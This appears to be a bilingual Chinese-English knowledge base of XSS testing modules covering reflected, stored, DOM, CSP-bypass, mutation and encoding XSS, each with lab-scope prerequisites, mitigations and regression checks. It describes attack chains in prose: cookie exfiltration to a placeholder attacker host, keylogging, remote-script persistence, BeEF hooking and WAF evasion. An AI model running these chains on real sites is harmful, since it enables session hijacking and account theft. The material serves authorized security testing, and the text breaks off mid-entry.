name.zh: 反射型 XSS 输出边界

description.zh: 覆盖反射型 XSS 的输出边界探测与利用：从基础脚本与事件处理器注入，到大小写与标签变形绕过，再到 Cookie 窃取与键盘记录收集链，并附编码类绕过变体，用于确认反射点是否可控及其影响。
description.en: Covers reflected XSS output-boundary probing and exploitation: from basic script and event-handler injection through case and tag mutation bypasses to cookie-theft and keylogger collection chains, with encoding bypass variants, to confirm whether a reflection point is controllable and what its impact is.

prerequisites.zh: 确认 反射型 XSS 输出边界 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for Reflected XSS Output Boundary are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: 覆盖反射型 XSS 从输出边界探测到利用链的完整流程：基础脚本与事件载荷确认反射点可控，大小写与标签变形测试过滤强度，再以 Image/fetch/location 外传 Cookie、注入按键监听完成会话窃取链。适用于参数回显进入 HTML 响应的场景。
overview.en: Covers the full reflected XSS flow from output-boundary probing to exploitation chains: basic script and event payloads confirm a controllable reflection point, case and tag mutations test filter strength, then Image/fetch/location exfiltrates cookies and an injected key listener completes the session-theft chain. Suitable when parameters echo into HTML responses.

vulnerability.zh: 根因是用户输入未经上下文编码直接进入响应的 HTML、属性或脚本位置，浏览器把反射内容解析为可执行代码；黑名单过滤与字符串替换无法覆盖全部标签与事件形态，反射点因此可执行。
vulnerability.en: The root cause is user input entering HTML, attribute, or script positions of the response without context-appropriate encoding, so the browser parses reflected content as executable code; blacklists and string replacement cannot cover every tag and event form, leaving the reflection point executable.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步提交基础脚本与事件载荷，alert 弹出或载荷原样出现即确认反射点可控；第 2-3 步逐行测试事件处理器与大小写/标签变形定位过滤缺口；确认后用第 4 步把 document.cookie 经 Image/fetch/location 发往 {ATTACKER_HOST} 收集端，第 5 步注入按键监听验证键盘记录链。被 WAF 拦截时改用 HTML 实体、Unicode 编码与双写绕过变体。
exploitation.en: Use in Payload list order: step 1 submits basic script and event payloads; an alert or verbatim payload echo confirms a controllable reflection point. Steps 2-3 test event handlers and case/tag mutations line by line to locate filter gaps. Once confirmed, step 4 sends document.cookie to the {ATTACKER_HOST} collector via Image/fetch/location, and step 5 injects a key listener to verify the keylogging chain. When blocked by a WAF, switch to HTML-entity, Unicode-encoding, and double-write variants.

mitigation.zh: 按输出上下文使用框架自动编码，富文本走维护中的 sanitizer，部署 CSP 并给 Cookie 加 HttpOnly/Secure/SameSite；修复后重放全部载荷应无脚本执行，收集端不应收到任何外传请求。
mitigation.en: Use framework auto-encoding per output context, route rich text through a maintained sanitizer, deploy CSP, and set HttpOnly/Secure/SameSite on cookies; after the fix, replaying all payloads must yield no script execution and the collector must receive nothing.

title.zh: 提交基础标签探测输出点

description.zh: 在参数中提交 script、img、svg 三类基础标签，观察返回页面是否原样执行或弹窗，确认反射输出位置与转义情况。
description.en: Submit script, img and svg tags in the parameter and watch for execution or alerts to map the reflected sink and its escaping.

title.zh: 事件处理器载荷绕过标签过滤
title.en: Use event handlers when tags are filtered

description.zh: script 标签被过滤时改用 onerror、onload、autofocus 等事件属性触发，图片加载失败即执行代码，弹窗确认通道保持。
description.en: If the script tag is filtered, pivot to onerror/onload/autofocus attributes so a broken image load still fires the payload.

title.zh: 编码与双写穿透 WAF
title.en: Punch through the WAF with encoding and double-write

description.zh: 拦截时改用 HTML 实体编码、Unicode 转义或双写标签变体，破坏特征匹配后载荷仍被浏览器解码执行成功。
description.en: When blocked, switch to HTML entities, Unicode escapes or double-written tags; the browser still decodes and runs the payload.

title.zh: 窃取 Cookie 完成利用
title.en: Steal cookies to finish the exploit

description.zh: 执行点确认后注入外带脚本，把 document.cookie 拼进请求发往控制端，收到 Cookie 即可冒充受害者会话操作账户。
description.en: With execution confirmed, inject a beacon that ships document.cookie to the collector; receiving it enables session impersonation.

analysis.zh: 反射型 XSS 输出边界只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: Reflected XSS Output Boundary is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 验证请求参数是否未经上下文编码进入当前响应的可执行 HTML、属性或脚本位置。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

name.zh: 存储型 XSS 持久化边界

description.zh: 覆盖存储型 XSS 的持久化注入与控制验证：从存储点直注与标签闭合，到隐蔽载荷与持久化控制，再到 BeEF 钩子注入，并附 SVG 与 MathML 标签绕过，用于确认恶意脚本能否长期驻留并触发。
description.en: Covers stored XSS persistence injection and control validation: from direct injection and tag closure at storage points through stealth payloads and persistent control to BeEF hook injection, with SVG and MathML tag bypasses, to confirm whether malicious scripts can persist and fire long-term.

prerequisites.zh: 确认 存储型 XSS 持久化边界 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for Stored XSS Persistence Boundary are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: 覆盖存储型 XSS 的持久化注入验证：存储点直注与属性闭合确认持久化执行，隐蔽载荷绕过目视检查，动态脚本加载实现持久化控制，并验证 BeEF 钩子的上线链路。适用于评论、资料等存储后被多用户查看的字段。
overview.en: Covers persistent injection verification for stored XSS: direct injection and attribute closure at the storage point to confirm persistent execution, hidden payloads bypassing visual inspection, dynamic script loading for persistent control, and the BeEF hook check-in chain. Suitable for fields stored and later viewed by many users, such as comments and profiles.

vulnerability.zh: 根因是用户输入被存储后未按 HTML 上下文编码即输出到查看页，恶意标签随数据持久化并对每个查看者执行；存储路径的输出编码缺失使影响从单次反射放大为持久控制。
vulnerability.en: The root cause is stored user input echoed to viewing pages without HTML-context encoding, so malicious tags persist with the data and execute for every viewer; missing output encoding on the storage path amplifies a one-shot reflection into persistent control.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步在存储点直注 script 并用 "> 闭合既有属性，重新查看页面执行即确认持久化；第 2 步以隐藏样式事件载荷验证隐蔽形态可绕过目视检查；第 3 步注入指向 {ATTACKER_HOST} 的一次性动态脚本实现持久化控制；第 4 步注入 {BEEF_HOST} 的 hook.js，BeEF 控制台出现浏览器上线即确认钩取链路。被 WAF 拦截时改用 SVG/MathML 标签绕过。
exploitation.en: Use in Payload list order: step 1 injects a script tag directly at the storage point and closes the existing attribute with ">; execution on revisiting the page confirms persistence. Step 2 verifies hidden-styled event payloads bypass visual inspection; step 3 injects a one-time dynamic script pointing at {ATTACKER_HOST} for persistent control; step 4 injects hook.js from {BEEF_HOST}, with the browser appearing in the BeEF console confirming the hooking chain. When blocked by a WAF, switch to SVG/MathML tag variants.

mitigation.zh: 存储输出按上下文编码，富文本走 sanitizer 白名单，CSP 限制 script-src，危险字段入库前校验；修复后重放存储载荷应在所有查看页原样显示不执行，后台与导出场景一并回归。
mitigation.en: Encode stored output by context, run rich text through a sanitizer allowlist, restrict script-src via CSP, and validate hazardous fields before persistence; after the fix, replayed payloads must render verbatim without execution on every viewing page, including admin and export views.

title.zh: 存储点直注闭合标签
title.en: Inject and close tags at the storage point

description.zh: 在个人简介、评论等存储字段提交 script 标签与引号闭合变体，提交后查看展示页，确认载荷是否原样入库并执行。
description.en: Submit script tags and quote-closure variants in profile or comment fields, then view the render page to confirm stored execution.

title.zh: 隐蔽载荷规避界面暴露

description.zh: 直接弹窗易被用户察觉并下线处理，改用隐藏样式的事件标签触发，页面视觉无异常但代码照常执行，显著延长驻留时间。
description.en: Swap alerts for hidden-styled event tags so code runs without visual anomalies, extending the payload's dwell time.

title.zh: 注入持久化远程脚本加载

description.zh: 存储一段带去重判断的脚本，页面首次渲染即动态加载控制端远程脚本，后续攻击功能远程可控实现一次注入长期驻留。
description.en: Store a guard-checked script that dynamically loads evil.js on first render, keeping remote control after a single injection.

title.zh: SVG 与 Math 标签变体穿透过滤
title.en: Use SVG/Math variants to defeat filters

description.zh: script 被清洗时改用 SVG 命名空间的 animate、set 事件标签触发，maction 等冷门标签同样执行代码绕过过滤。
description.en: When scripts are sanitized, fire payloads from SVG animate/set tags or obscure MathML elements that still execute code.

analysis.zh: 存储型 XSS 持久化边界只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: Stored XSS Persistence Boundary is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 验证无害标记是否被持久化，并在不同查看者页面进入可执行浏览器上下文。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

name.zh: DOM XSS 源到汇边界

description.zh: 覆盖 DOM XSS 的源到汇路径验证：从 Hash 与查询参数源注入，到常见 Sink 点与完整利用 URL 构造，再到 postMessage 源注入，并附 javascript: 协议与 SVG 标签绕过变体。
description.en: Covers DOM XSS source-to-sink path validation: from hash and query-parameter source injection through common sink points and full exploit URL construction to postMessage source injection, with javascript: protocol and SVG tag bypass variants.

prerequisites.zh: 确认 DOM XSS 源到汇边界 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for DOM XSS Source-to-Sink Boundary are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: 覆盖 DOM XSS 的源到汇路径验证：location.hash/search 与 postMessage 等源进入 document.write/innerHTML/eval 等危险汇，并构造完整利用 URL 确认端到端触发。适用于前端把 URL 数据写入 DOM 而无服务端参与的场景。
overview.en: Covers source-to-sink verification for DOM XSS: location.hash/search and postMessage sources flowing into hazardous sinks such as document.write/innerHTML/eval, plus a full exploit URL confirming end-to-end triggering. Suitable when frontend code writes URL data into the DOM without server involvement.

vulnerability.zh: 根因是前端脚本把 location、postMessage 等不可信源未经净化写入 innerHTML、document.write、eval 等执行性 DOM 汇；源到汇之间缺少编码或安全 API 替代即构成可触发的执行路径。
vulnerability.en: The root cause is frontend scripts writing untrusted sources such as location and postMessage into executable DOM sinks like innerHTML, document.write, and eval without sanitization; the lack of encoding or a safe-API substitute between source and sink forms a triggerable execution path.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步把载荷分别放入 location.hash 与 location.search 观察是否触发；第 2 步对照 document.write、innerHTML、eval、setTimeout、jQuery html 等汇点确认可达数据流；第 3 步打开携带 hash 载荷的完整 {LAB_APP} URL，弹窗即确认端到端触发；第 4 步用 postMessage 注入 img 载荷验证消息源。被拦截时改用 javascript: 协议或 SVG/MathML 变体。
exploitation.en: Use in Payload list order: step 1 places payloads into location.hash and location.search to see if they trigger; step 2 checks reachable flows against sinks like document.write, innerHTML, eval, setTimeout, and jQuery html; step 3 opens the full {LAB_APP} URL carrying the hash payload, with the popup confirming end-to-end triggering; step 4 injects an img payload via postMessage to verify the message source. When blocked, switch to javascript: protocol or SVG/MathML variants.

mitigation.zh: 危险 DOM 汇改用 textContent 等安全 API，postMessage 校验 origin 与数据结构，引入 Trusted Types 与 CSP；修复后重放各源载荷，DOM 中不应出现可执行节点。
mitigation.en: Replace hazardous DOM sinks with safe APIs like textContent, validate postMessage origin and data shape, and adopt Trusted Types plus CSP; after the fix, replaying payloads from each source must leave no executable nodes in the DOM.

title.zh: hash 与参数注入探测源
title.en: Probe sources via hash and query injection

description.zh: 把载荷放进 URL hash 与查询参数后刷新页面，观察是否弹窗触发，确认 location 类源是否流入前端渲染路径。
description.en: Place payloads in the URL hash and query string and reload; alerts reveal whether location-derived sources reach rendering.

title.zh: 定位危险 sink 函数

description.zh: 审查页面脚本中 document.write、innerHTML、eval、setTimeout 与 jQuery html 调用，找到把源数据写进 DOM 的汇聚点。
description.en: Scan page scripts for document.write, innerHTML, eval, setTimeout and jQuery html calls to find where source data lands in the DOM.

title.zh: 构造完整触发 URL

description.zh: 结合第 2 步的 sink 拼出带载荷的完整 URL 诱使受害者点击，hash 片段不发往服务器可绕过服务端过滤直达前端执行。
description.en: Combine the step 2 sink into a payload-bearing URL; the hash never reaches the server, bypassing server-side filters entirely.

title.zh: postMessage 跨窗口注入

description.zh: 向目标窗口 postMessage 发送载荷字符串，监听方未校验来源把数据写进 innerHTML，跨 iframe 场景同样触发执行。
description.en: Send payload strings via postMessage to a listener that writes them into innerHTML unchecked, triggering execution across frames.

title.zh: javascript 协议与编码变体
title.en: Use javascript: schemes and encoding variants

description.zh: sink 为 href 时用 javascript 协议配合大小写、实体与制表符变体书写，穿透协议过滤后受害者点击链接即执行代码。
description.en: For href sinks, write javascript: URIs with case, entity or tab variants; surviving the filter means one click executes code.

analysis.zh: DOM XSS 源到汇边界只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: DOM XSS Source-to-Sink Boundary is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 验证 location、postMessage 等不可信源是否到达 innerHTML 等危险 DOM 汇。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

name.zh: CSP 回归与脚本来源审计

description.zh: 覆盖 CSP 策略弱点的验证与利用：从响应头基线与 unsafe-inline/unsafe-eval 求值，到白名单域 JSONP 回调与 Angular 表达式执行，再到 Cookie 外带，并附 base 注入与 Nonce 窃取。
description.en: Covers validation and exploitation of weak CSP policies: from response-header baseline and unsafe-inline/unsafe-eval evaluation through whitelisted-domain JSONP callbacks and Angular expression execution to cookie exfiltration, with base injection and nonce theft.

prerequisites.zh: 确认 CSP 回归与脚本来源审计 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for CSP Regression and Script-Source Audit are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: 覆盖 CSP 策略弱点的逐项验证：unsafe-inline/unsafe-eval 下直接执行，白名单域 JSONP 回调与 Angular 表达式利用策略缺口，img onerror 外带 Cookie，并附 base 注入与 Nonce 窃取变体。适用于评估现有 CSP 强度的场景。
overview.en: Covers item-by-item verification of CSP policy weaknesses: direct execution under unsafe-inline/unsafe-eval, JSONP callbacks on allowlisted domains and Angular expressions exploiting policy gaps, cookie exfiltration via img onerror, plus base-injection and nonce-theft variants. Suitable for assessing the strength of an existing CSP.

vulnerability.zh: 根因是 CSP 配置存在缺口：允许 unsafe-inline/unsafe-eval、白名单域上存在 JSONP/Angular 等可滥用端点、img-src 未收紧或 base-uri 未限制；策略缺口使注入脚本绕过脚本来源限制执行。
vulnerability.en: The root cause is gaps in CSP configuration: unsafe-inline/unsafe-eval allowed, exploitable endpoints like JSONP/Angular present on allowlisted domains, img-src and base-uri unrestricted; these gaps let injected scripts bypass script-origin restrictions and execute.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步读取目标 CSP 响应头作为基线；允许 unsafe-inline 时用第 2 步直注，允许 unsafe-eval 时用第 3 步 eval/setTimeout 执行；第 4 步把 allowed-domain.com 替换为策略实际白名单域借 JSONP 回调执行；第 5 步用 Angular orderBy 链在禁 inline/eval 的策略下触发；第 6 步以 img onerror 把 Cookie 拼入 {ATTACKER_HOST} URL 外带。被拦截时参考 base 注入与 Nonce 窃取变体。
exploitation.en: Use in Payload list order: step 1 reads the target CSP header as a baseline; under unsafe-inline inject directly with step 2, under unsafe-eval execute via eval/setTimeout with step 3; step 4 replaces allowed-domain.com with the policy's actual allowlisted domain to execute via a JSONP callback; step 5 triggers through the Angular orderBy chain when inline/eval are blocked; step 6 concatenates cookies into a {ATTACKER_HOST} URL via img onerror for exfiltration. When blocked, see the base-injection and nonce-theft variants.

mitigation.zh: 采用基于 nonce/hash 的严格 CSP，移除 unsafe-inline/eval，收紧 img-src/connect-src/base-uri，并审计白名单域上的 JSONP 端点；修复后重放各载荷应被 CSP 拦截并产生违规报告。
mitigation.en: Adopt a strict nonce/hash-based CSP, remove unsafe-inline/eval, tighten img-src/connect-src/base-uri, and audit JSONP endpoints on allowlisted domains; after the fix, replayed payloads must be blocked by CSP and generate violation reports.

title.zh: 分析 CSP 头策略面

description.zh: 抓取响应中的 Content-Security-Policy 头，逐条解读 default-src、script-src 指令与白名单域，找出宽松配置点。
description.en: Capture the Content-Security-Policy header and parse default-src, script-src and whitelisted origins to spot lax directives.

title.zh: unsafe-inline 时直接注入

description.zh: script-src 含 unsafe-inline 说明内联脚本被放行，直接提交 script 标签即可执行，无需任何额外绕过构造。
description.en: An unsafe-inline in script-src permits inline scripts, so a plain script tag executes without any bypass construction.

title.zh: 白名单域 JSONP 回调执行

description.zh: 白名单域存在 JSONP 端点时，以 script src 引入并把执行代码写进 callback 参数，脚本来源合法故 CSP 放行执行。
description.en: Point a script tag at a whitelisted JSONP endpoint with the payload as the callback; the trusted origin passes CSP and runs the code.

title.zh: Angular 表达式绕过

description.zh: 页面引入 Angular 时用 ng-focus 触发 orderBy 链构造表达式，从原型链拿到构造函数执行任意代码，无需新增脚本源。
description.en: On Angular pages, ng-focus plus orderBy chains abuse the prototype chain to execute code without adding any script source.

title.zh: base 注入劫持相对路径
title.en: Hijack relative paths with base injection

description.zh: 插入 base 标签改写相对路径解析基准，页面后续加载的相对脚本转向控制端服务器，并可借 CSS 选择器外带 nonce。
description.en: Inject a base tag so later relative script loads resolve to the attacker host, while CSS selectors can leak script nonces.

analysis.zh: CSP 回归与脚本来源审计只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: CSP Regression and Script-Source Audit is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 核对 CSP 是否限制脚本来源、内联执行、动态求值、base-uri 与对象加载，并区分策略缺口和 XSS 根因。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

name.zh: 浏览器解析突变 XSS

description.zh: 覆盖 mXSS 突变型 XSS 的解析差异验证：从基础突变探测，到 SVG 与 MathML 命名空间下的标签重解析，再到与 DOM clobbering 的组合利用，用于确认净化输出经浏览器二次解析后复活为脚本。
description.en: Covers parsing-differential validation of mutation XSS: from basic mutation probing through tag re-parsing under SVG and MathML namespaces to combined use with DOM clobbering, confirming sanitized output revives as script after browser re-parsing.

prerequisites.zh: 确认 浏览器解析突变 XSS 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for Browser Parsing Mutation XSS are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: 覆盖突变型 XSS（mXSS）的解析差异验证：noscript 解析差异下的属性逃逸、SVG CDATA 与 MathML mglyph/style 命名空间突变、以及 DOM clobbering 组合触发。用于确认净化后的输出经浏览器二次解析复活为可执行脚本。
overview.en: Covers parsing-differential verification for mutation XSS (mXSS): attribute escape under noscript parsing differences, SVG CDATA and MathML mglyph/style namespace mutations, and combined triggering with DOM clobbering. Used to confirm sanitized output reviving as executable script after the browser re-parses it.

vulnerability.zh: 根因是净化器按字符串或静态 DOM 视图处理输出，而浏览器解析器会按命名空间与上下文修复重排标记，SVG/MathML/noscript 等位置的二次解析把无害结构突变回可执行节点；净化模型与解析器语义不一致即构成缺口。
vulnerability.en: The root cause is sanitizers operating on strings or a static DOM view while browser parsers repair and rearrange markup by namespace and context: re-parsing in SVG/MathML/noscript positions mutates harmless structures back into executable nodes. The mismatch between the sanitizer model and parser semantics is the gap.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步提交 noscript 解析差异样例，渲染后 img 载荷执行即确认基础 mXSS；第 2 步以 SVG CDATA 突变验证命名空间复活，第 3 步以 MathML mglyph/style 突变验证对应分支，第 4 步用重复 id 表单配合 DOM clobbering 触发。命中后对比净化前后 DOM 确认突变点。每个阳性样例保留最小复现片段，供修复后回归对照。
exploitation.en: Use in Payload list order: step 1 submits the noscript parsing-differential sample, with the img payload executing after rendering confirming basic mXSS; step 2 verifies namespace revival via SVG CDATA mutation, step 3 the MathML branch via mglyph/style mutation, and step 4 combines duplicate-id forms with DOM clobbering. On a hit, diff pre- and post-sanitization DOMs to pinpoint the mutation. Keep a minimal reproducible fragment per positive sample for post-fix regression comparison.

mitigation.zh: 净化器按最终 DOM 树输出序列化结果并在浏览器语义下复验，禁止 SVG/MathML 命名空间内的可疑结构，修复重复 id/name 的 DOM clobbering 面；修复后重放各突变载荷应在二次解析后保持不可执行。
mitigation.en: Have sanitizers serialize from the final DOM tree and re-verify under browser semantics, forbid suspicious structures inside SVG/MathML namespaces, and fix the DOM clobbering surface from duplicate id/name; after the fix, replayed mutation payloads must remain non-executable after re-parsing.

title.zh: noscript 突变探测 mXSS
title.en: Probe mXSS with a noscript mutation

description.zh: 提交嵌套 title 属性的 noscript 载荷，浏览器上下文切换时标签结构被重新解析，原本无害属性重组出可执行 img 事件。
description.en: Submit the noscript payload with a nested title attribute; context switches reparse the DOM and reassemble an executable img event.

title.zh: SVG CDATA 区段突变

description.zh: 在 svg 内嵌 CDATA 包裹载荷，净化器按原始文本处理放行，浏览器二次解析时把内容当节点执行，脚本随之触发执行。
description.en: Wrap payloads in CDATA inside svg; sanitizers see inert text while the browser's second parse turns it into executable nodes.

title.zh: MathML 嵌套结构突变

description.zh: 用 math、mtext、mglyph、style 多层嵌套制造解析分歧，过滤与渲染结果不一致时，注入的 img 事件在浏览器侧执行。
description.en: Stack math, mtext, mglyph and style layers so filtering and rendering disagree; the injected img event executes browser-side.

title.zh: DOM clobbering 配合触发
title.en: Combine with DOM clobbering to trigger

description.zh: 注入重复 id 的 form 元素覆盖全局变量，应用脚本引用被篡改的引用进入异常分支，为载荷执行创造触发条件。
description.en: Inject duplicate-id form elements to clobber globals; application scripts dereference the tampered references into attacker-controlled paths.

title.zh: 实体编码嵌套变体

description.zh: 在 svg script 内混排十进制与十六进制实体，净化器视其为普通文本，解码后浏览器执行代码，保持突变链路可用。
description.en: Mix decimal and hex entities inside svg script text; sanitizers treat it as text while the decoded result executes in the browser.

analysis.zh: 浏览器解析突变 XSS只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: Browser Parsing Mutation XSS is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 比较净化前后 DOM，确认浏览器修复或重排标记时是否重新形成可执行节点。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

name.zh: Unicode 与字符编码 XSS 边界

description.zh: 覆盖字符编码维度的 XSS 绕过验证：从 Unicode 转义与 HTML 实体编码，到全角与 UTF-7 历史编码前提，再到混合编码与非法过长 UTF-8 对照，用于确认解码链不一致导致的过滤缺口。
description.en: Covers XSS bypass validation across character-encoding dimensions: from Unicode escapes and HTML entity encoding through fullwidth and legacy UTF-7 preconditions to mixed-encoding and invalid overlong UTF-8 controls, confirming filter gaps caused by inconsistent decode chains.

prerequisites.zh: 确认 Unicode 与字符编码 XSS 边界 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for Unicode and Character-Encoding XSS Boundary are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: 覆盖字符编码维度的 XSS 绕过验证：JS 的 \u/\x/\u{} 转义书写关键字、HTML 实体编码事件载荷、全角字符规范化前提与 UTF-7 历史编码前提。用于确认解码链不一致造成的过滤缺口及其成立前提。
overview.en: Covers XSS bypass verification across the character-encoding dimension: writing keywords with JS \u/\x/\u{} escapes, HTML-entity-encoded event payloads, fullwidth-character normalization preconditions, and UTF-7 legacy-encoding preconditions. Used to identify filtering gaps caused by inconsistent decode chains and their preconditions.

vulnerability.zh: 根因是过滤层与浏览器/JS 引擎对同一字节序列的解码结果不一致：JS 转义与 HTML 实体在最终执行前才还原，全角与 UTF-7 仅在授权链路执行规范化或显式声明时才形成标签；按字面匹配的过滤因此被绕过。
vulnerability.en: The root cause is decode divergence between the filter and the browser/JS engine over the same byte sequence: JS escapes and HTML entities restore only before final execution, while fullwidth and UTF-7 form tags only when the authorized chain normalizes or explicitly declares them; literal-matching filters are therefore bypassed.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步以 \u/\x/\u{} 转义书写 alert，JS 解码后执行即确认转义绕过关键字检测；第 2 步以十进制/十六进制 HTML 实体提交事件载荷，解码后执行即确认实体绕过；第 3、4 步为前提验证——全角与 UTF-7 样例只在授权链路先执行 NFKC 规范化或显式声明 UTF-7 时才可能形成标签，现代 UTF-8 页面不会直接解码。被 WAF 拦截时参考混合编码变体。
exploitation.en: Use in Payload list order: step 1 writes alert with \u/\x/\u{} escapes; execution after JS decoding confirms escape-based keyword bypass. Step 2 submits event payloads as decimal/hex HTML entities; execution after decoding confirms entity bypass. Steps 3 and 4 are precondition checks — fullwidth and UTF-7 samples form tags only when the authorized chain applies NFKC normalization or explicitly declares UTF-7; modern UTF-8 pages never decode them directly. When blocked by a WAF, see the mixed-encoding variants.

mitigation.zh: 输出按上下文编码并统一字符集为 UTF-8，禁止在编码转换后再进入 HTML 上下文，过滤层按解码后的语义匹配；修复后重放转义、实体与编码变体均不应产生可执行内容。
mitigation.en: Encode output by context, unify charset to UTF-8, never let converted encodings re-enter HTML context, and match filters on decoded semantics; after the fix, replayed escape, entity, and encoding variants must yield no executable content.

title.zh: JavaScript Unicode 转义执行

description.zh: 用多种 Unicode 转义形式书写函数首字母，过滤器匹配不到完整函数名，脚本引擎解码后照常执行载荷代码。
description.en: Spell alert with \u0061, \x61 or \u{61} escapes so filters miss the function name while the JS engine still decodes and runs it.

title.zh: HTML 实体编码绕过

description.zh: 事件属性值改用十进制与十六进制实体编码函数名，检测设备只看到数字与井号，浏览器解码后事件处理器正常调用执行。
